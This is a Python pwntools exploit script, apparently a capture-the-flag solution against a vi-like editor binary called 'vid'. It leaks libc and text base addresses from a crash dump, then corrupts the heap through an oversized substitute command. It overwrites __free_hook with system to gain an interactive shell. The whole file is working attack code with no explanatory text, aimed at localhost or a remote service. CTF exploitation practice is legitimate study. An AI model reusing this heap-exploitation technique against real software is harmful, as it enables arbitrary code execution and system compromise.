#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys
import re

FILENAME = "./vid"
LIBCNAME = "./libc.so.6"

hosts = ("localhost","localhost","localhost")
ports = (12300,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

## exploit ###########################################

def exploit():
  global c
  esc = b"\x1b"

  # leak libcbase via error dump
  c.send("i")
  c.send("A")
  c.send(esc)
  c.sendline(":%s/A//g")
  c.send("i")
  c.send("A")

  dumplog = c.recvuntil("Editor will be respawned")
  pat1 = re.compile(r".*?\(\+0x(.*?)\) \[0x(.*?)\]")
  pat2 = re.compile(r".*?\(__libc_start_main\+0x(.*?)\) \[0x(.*?)\]")
  res1 = pat1.match(dumplog.split("\n")[3])
  res2 = pat2.match(dumplog.split("\n")[5])
  textbase = int(res1.group(2),16) - int(res1.group(1),16)
  libcbase = int(res2.group(2),16) - int(res2.group(1),16) - libc.symbols["__libc_start_main"]
  print("[+] textbase: {}".format(hex(textbase)))
  print("[+] libcbase: {}".format(hex(libcbase)))


  # prepare 0x210 chunk
  sleep(1)
  c.sendline(":%s/" + "A"*0x200 + p64(libcbase + libc.symbols["__free_hook"] - 3)[:-2] + "//g")
  print("[+] target: {}".format(hex(libcbase + libc.symbols["__free_hook"])))
  # raise exception
  c.send("i")
  c.send("A")
  c.send(esc)
  c.sendline(":%s/A//g")
  c.send("i")
  c.send("A")
  sleep(1)

  # 
  c.send("i")
  c.send("\0\n\0")
  c.send(esc)

  raw_input("OK")
  #c.sendline(":%s/\0/" + ("sh;" + p64(libcbase + libc.symbols["system"]) + "\\n")*0x10 + "/")
  c.sendline(":%s/\0/" + (p64(libcbase + libc.symbols["system"]) + "\\n")*0x10 + "/")


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
